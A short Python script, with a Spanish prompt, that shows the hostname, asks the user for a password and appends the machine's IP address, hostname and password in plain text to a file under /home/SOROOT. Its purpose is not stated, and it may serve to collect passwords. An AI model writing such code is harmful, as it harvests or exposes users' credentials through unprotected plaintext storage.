import os
import socket
import getpass


infile = open('/home/SOROOT/dir.txt','a')

comando = 'hostname'
s = os.popen(comando).read()


print (s,' Ingrese su contrasena')
passw = getpass.getpass()

infile.write(socket.gethostbyname(socket.gethostname()))
infile.write(" ")
infile.write(s)
infile.write(" ")
infile.write(passw)

infile.close()

